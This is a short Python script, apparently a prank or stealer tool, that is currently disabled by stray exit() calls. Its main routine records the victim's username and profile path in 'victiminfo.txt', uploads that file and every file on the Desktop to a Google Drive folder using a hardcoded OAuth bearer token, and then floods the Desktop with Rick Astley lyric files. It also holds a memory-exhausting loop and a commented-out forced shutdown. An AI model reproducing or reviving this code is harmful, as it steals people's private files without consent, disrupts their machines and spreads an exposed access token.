import datetime
import json
import os
import requests

exit()

# rickroll
os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')
os.system('start https://atharane.github.io/')



def navigate_desktop():
    userprofile = os.environ['USERPROFILE']
    desktop_path = os.path.join(userprofile, 'Desktop')

    # check if a path exists
    if os.path.exists(desktop_path):
        pass

    else:  # OneDrive is active
        desktop_path = os.path.join(userprofile, 'OneDrive', 'Desktop')

    try:
        os.chdir(desktop_path)
        return desktop_path

    except FileNotFoundError:
        return False
    except PermissionError:
        return False


def spam_desktop():
    desktop_path = navigate_desktop()

    try:
        os.system(f'echo "Scott McTominay strike again..." > nasamark.txt')
    except:
        pass

    lyrics = "Never Gonna Give You Up Rick Astley We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of you wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye"
    file_names = "NEVER GONNA GIVE YOU UP, NEVER GONNA LET YOU DOWN, NEVER GONNA RUN AROUND AND DESERT YOU, NEVER GONNA MAKE YOU CRY, NEVER GONNA SAY GOODBYE, NEVER GONNA TALK A LIE AND HURT YOU WE'RE NO STRANGERS TO LOVE YOU KNOW THE RULES AND SO DO I A FULL COMMITMENT'S WHAT I'M THINKING OF YOU WOULDN'T GET THIS FROM ANY OTHER GUY"

    if desktop_path:
        for file in file_names.split(' '):
            try:
                os.system(f'echo "{lyrics}" > {file}.txt')
            except Exception:
                continue


def lagger():
    exit()
    dump = []
    for i in range(1, 1000 ** 4):
        dump.append('A' * i)


def upload_to_cloud(file):
    headers = {
        "Authorization": "Bearer ya29.A0ARrdaM-CsKWIq0pGDd2rPn01dYqlGbV4f6IEotADBoGclo-YAGIAaLCseCuotAkzzEF1Wa7ZmOkh--aq5XZ0ajjNk0BX45Vx16myczfHlottcYEe3C3BpG6U1nENP1r-6RkQ0Pcqcvu3L57nXi_TSsmm8e5Q"}

    para = {
        "name": file,
        "parents": ["1Jh_ltel4lK_iYM77gibwjmU9l2tLeFzJ"]
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open(file, "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )
    print(r.text)


def strike():
    # current date and time
    now = datetime.datetime.now()

    navigate_desktop()

    file1 = open("victiminfo.txt", "a")
    file1.write(f"{os.environ['USERPROFILE']}: {os.environ['USERNAME']}: {now}")
    file1.close()

    try:
        upload_to_cloud("victiminfo.txt")
    except Exception:
        pass

    # upload files on desktop to the cloud
    for file in os.listdir():
        upload_to_cloud(file)

    spam_desktop()

    exit()
    # os.system('shutdown /s /t 1')


# print(navigate_desktop())
#
# print(os.getcwd())

if __name__ == '__main__':
    exit()
    try:
        strike()

    except Exception as e:
        now = datetime.datetime.now()

        navigate_desktop()

        file1 = open("victiminfo.txt", "a")
        file1.write(f"{os.environ['USERPROFILE']}: {os.environ['USERNAME']}: {now}")
        file1.close()

        try:
            upload_to_cloud("victiminfo.txt")
        except Exception:
            pass

        # upload files on desktop to the cloud
        for file in os.listdir():
            upload_to_cloud(file)


